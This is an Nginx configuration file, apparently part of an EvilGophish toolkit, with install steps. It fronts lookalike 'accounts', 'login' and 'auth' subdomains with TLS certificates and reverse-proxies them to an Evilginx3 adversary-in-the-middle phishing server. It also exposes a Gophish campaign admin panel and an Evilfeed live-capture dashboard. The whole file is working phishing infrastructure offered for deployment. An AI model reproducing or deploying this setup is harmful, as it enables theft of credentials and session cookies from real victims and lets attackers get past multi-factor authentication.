# EvilGophish + Frameless-BitB Nginx Configuration
# Alternative to Apache reverse proxy setup
#
# Installation:
# 1. Copy to /etc/nginx/sites-available/evilgophish
# 2. Replace YOUR_DOMAIN with actual domain
# 3. Update SSL certificate paths
# 4. sudo ln -s /etc/nginx/sites-available/evilgophish /etc/nginx/sites-enabled/
# 5. sudo nginx -t && sudo systemctl reload nginx

# Upstream servers
upstream evilginx {
    server 127.0.0.1:8443;
    keepalive 32;
}

upstream gophish_admin {
    server 127.0.0.1:3333;
}

upstream evilfeed {
    server 127.0.0.1:1337;
}

# Rate limiting zone
limit_req_zone $binary_remote_addr zone=phishing:10m rate=10r/s;

# HTTPS server for phishing domains
server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;

    server_name accounts.YOUR_DOMAIN login.YOUR_DOMAIN auth.YOUR_DOMAIN;

    # SSL/TLS Configuration
    ssl_certificate /etc/letsencrypt/live/YOUR_DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/YOUR_DOMAIN/privkey.pem;
    ssl_trusted_certificate /etc/letsencrypt/live/YOUR_DOMAIN/chain.pem;

    # Modern TLS configuration
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;

    # SSL session configuration
    ssl_session_timeout 1d;
    ssl_session_cache shared:SSL:50m;
    ssl_session_tickets off;

    # OCSP Stapling
    ssl_stapling on;
    ssl_stapling_verify on;
    resolver 8.8.8.8 8.8.4.4 valid=300s;
    resolver_timeout 5s;

    # Security headers
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-XSS-Protection "1; mode=block" always;

    # Rate limiting
    limit_req zone=phishing burst=20 nodelay;

    # Proxy to Evilginx3
    location / {
        proxy_pass https://evilginx;
        proxy_ssl_verify off;

        # Proxy headers
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header X-Forwarded-Host $host;
        proxy_set_header X-Forwarded-Port $server_port;

        # WebSocket support
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";

        # Timeouts
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;

        # Buffer settings
        proxy_buffer_size 128k;
        proxy_buffers 4 256k;
        proxy_busy_buffers_size 256k;
    }

    # Logging
    access_log /var/log/nginx/evilgophish-access.log combined;
    error_log /var/log/nginx/evilgophish-error.log warn;
}

# HTTP to HTTPS redirect
server {
    listen 80;
    listen [::]:80;

    server_name accounts.YOUR_DOMAIN login.YOUR_DOMAIN auth.YOUR_DOMAIN;

    # ACME challenge for Let's Encrypt
    location /.well-known/acme-challenge/ {
        root /var/www/certbot;
    }

    # Redirect all other requests to HTTPS
    location / {
        return 301 https://$host$request_uri;
    }
}

# Internal Gophish Admin Proxy (optional - for remote access via VPN)
server {
    listen 127.0.0.1:8080 ssl;

    server_name localhost;

    ssl_certificate /etc/letsencrypt/live/YOUR_DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/YOUR_DOMAIN/privkey.pem;

    ssl_protocols TLSv1.2 TLSv1.3;

    # Basic authentication (optional)
    # auth_basic "Restricted Access";
    # auth_basic_user_file /etc/nginx/.htpasswd;

    location / {
        proxy_pass https://gophish_admin;
        proxy_ssl_verify off;

        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    access_log /var/log/nginx/gophish-admin-access.log combined;
    error_log /var/log/nginx/gophish-admin-error.log warn;
}

# Evilfeed Dashboard (internal only)
server {
    listen 127.0.0.1:8081;

    server_name localhost;

    location / {
        proxy_pass http://evilfeed;

        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

        # WebSocket support for live feed
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
    }

    access_log /var/log/nginx/evilfeed-access.log combined;
    error_log /var/log/nginx/evilfeed-error.log warn;
}
